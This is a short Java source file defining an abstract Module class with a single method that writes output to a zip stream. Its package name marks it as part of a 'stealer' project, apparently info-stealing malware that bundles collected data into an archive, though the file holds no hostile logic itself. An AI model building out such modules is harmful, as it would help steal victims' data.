package com.github.shurpe.stealer.module;

import java.util.zip.ZipOutputStream;

public abstract class Module {

	public abstract void toOutput(final ZipOutputStream outStream);
}
